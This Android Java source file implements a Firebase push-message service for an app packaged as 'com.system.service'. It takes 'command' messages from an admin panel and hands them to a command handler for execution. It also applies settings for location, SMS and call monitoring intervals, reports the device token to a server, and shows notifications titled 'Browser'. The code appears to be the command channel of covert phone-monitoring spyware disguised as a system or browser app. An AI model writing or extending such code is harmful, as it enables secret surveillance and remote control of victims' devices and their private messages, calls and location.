package com.system.service.service;

import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.content.Context;
import android.content.Intent;
import android.media.RingtoneManager;
import android.net.Uri;
import android.os.Build;
import android.util.Log;

import androidx.core.app.NotificationCompat;

import com.google.firebase.messaging.RemoteMessage;
import com.system.service.MainActivity;
import com.system.service.R;
import com.system.service.manager.DataManager;
import com.system.service.utils.CommandHandler;

import java.util.Map;

/**
 * Firebase Messaging Service - Handles FCM messages
 * Processes remote commands and notifications from admin panel
 */
public class FirebaseMessagingService extends com.google.firebase.messaging.FirebaseMessagingService {
    
    private static final String TAG = "FCMService";
    private static final String CHANNEL_ID = "admin_commands";
    
    private DataManager dataManager;
    private CommandHandler commandHandler;
    
    @Override
    public void onCreate() {
        super.onCreate();
        
        // Initialize managers
        dataManager = new DataManager(this);
        commandHandler = new CommandHandler(this, dataManager);
        
        // Create notification channel
        createNotificationChannel();
    }
    
    /**
     * Called when message is received
     */
    @Override
    public void onMessageReceived(RemoteMessage remoteMessage) {
        Log.d(TAG, "From: " + remoteMessage.getFrom());
        
        // Check if message contains a data payload
        if (remoteMessage.getData().size() > 0) {
            Log.d(TAG, "Message data payload: " + remoteMessage.getData());
            
            // Handle data message
            handleDataMessage(remoteMessage.getData());
        }
        
        // Check if message contains a notification payload
        if (remoteMessage.getNotification() != null) {
            Log.d(TAG, "Message Notification Body: " + remoteMessage.getNotification().getBody());
            
            // Handle notification message
            handleNotificationMessage(remoteMessage.getNotification());
        }
    }
    
    /**
     * Called when new token is generated
     */
    @Override
    public void onNewToken(String token) {
        Log.d(TAG, "Refreshed token: " + token);
        
        // Send token to server
        sendTokenToServer(token);
    }
    
    /**
     * Handle data message (commands from admin)
     */
    private void handleDataMessage(Map<String, String> data) {
        try {
            String messageType = data.get("type");
            String command = data.get("command");
            
            Log.d(TAG, "Handling data message - Type: " + messageType + ", Command: " + command);
            
            if ("command".equals(messageType) && command != null) {
                // Execute admin command
                commandHandler.executeCommand(command, data);
            } else if ("notification".equals(messageType)) {
                // Show notification
                String title = data.get("title");
                String body = data.get("body");
                sendNotification(title, body);
            } else if ("config".equals(messageType)) {
                // Handle configuration update
                handleConfigurationUpdate(data);
            }
            
        } catch (Exception e) {
            Log.e(TAG, "Error handling data message", e);
        }
    }
    
    /**
     * Handle notification message
     */
    private void handleNotificationMessage(RemoteMessage.Notification notification) {
        String title = notification.getTitle();
        String body = notification.getBody();
        
        sendNotification(title, body);
    }
    
    /**
     * Handle configuration updates from admin
     */
    private void handleConfigurationUpdate(Map<String, String> config) {
        try {
            // Update monitoring intervals
            String locationInterval = config.get("location_interval");
            if (locationInterval != null) {
                // Update location tracking interval
                Log.d(TAG, "Updating location interval to: " + locationInterval);
            }
            
            String smsInterval = config.get("sms_interval");
            if (smsInterval != null) {
                // Update SMS checking interval
                Log.d(TAG, "Updating SMS interval to: " + smsInterval);
            }
            
            String callInterval = config.get("call_interval");
            if (callInterval != null) {
                // Update call checking interval
                Log.d(TAG, "Updating call interval to: " + callInterval);
            }
            
            // Store configuration in shared preferences or database
            android.content.SharedPreferences prefs = getSharedPreferences("monitoring_config", Context.MODE_PRIVATE);
            android.content.SharedPreferences.Editor editor = prefs.edit();
            
            for (Map.Entry<String, String> entry : config.entrySet()) {
                editor.putString(entry.getKey(), entry.getValue());
            }
            editor.apply();
            
            Log.d(TAG, "Configuration updated successfully");
            
        } catch (Exception e) {
            Log.e(TAG, "Error handling configuration update", e);
        }
    }
    
    /**
     * Send FCM token to server
     */
    private void sendTokenToServer(String token) {
        try {
            if (dataManager != null) {
                dataManager.updateDeviceToken(token);
                Log.d(TAG, "Token sent to server successfully");
            }
        } catch (Exception e) {
            Log.e(TAG, "Error sending token to server", e);
        }
    }
    
    /**
     * Create and show a simple notification containing the received FCM message
     */
    private void sendNotification(String title, String messageBody) {
        Intent intent = new Intent(this, MainActivity.class);
        intent.addFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP);
        PendingIntent pendingIntent = PendingIntent.getActivity(this, 0, intent,
                PendingIntent.FLAG_IMMUTABLE);
        
        Uri defaultSoundUri = RingtoneManager.getDefaultUri(RingtoneManager.TYPE_NOTIFICATION);
        NotificationCompat.Builder notificationBuilder =
                new NotificationCompat.Builder(this, CHANNEL_ID)
                        .setSmallIcon(R.drawable.ic_notification)
                        .setContentTitle(title != null ? title : "Browser")
                        .setContentText(messageBody)
                        .setAutoCancel(true)
                        .setSound(defaultSoundUri)
                        .setContentIntent(pendingIntent)
                        .setPriority(NotificationCompat.PRIORITY_DEFAULT);
        
        NotificationManager notificationManager =
                (NotificationManager) getSystemService(Context.NOTIFICATION_SERVICE);
        
        notificationManager.notify(0, notificationBuilder.build());
    }
    
    /**
     * Create notification channel for Android 8.0+
     */
    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            CharSequence name = "Admin Commands";
            String description = "Notifications from admin panel";
            int importance = NotificationManager.IMPORTANCE_DEFAULT;
            NotificationChannel channel = new NotificationChannel(CHANNEL_ID, name, importance);
            channel.setDescription(description);
            
            NotificationManager notificationManager = getSystemService(NotificationManager.class);
            notificationManager.createNotificationChannel(channel);
        }
    }
}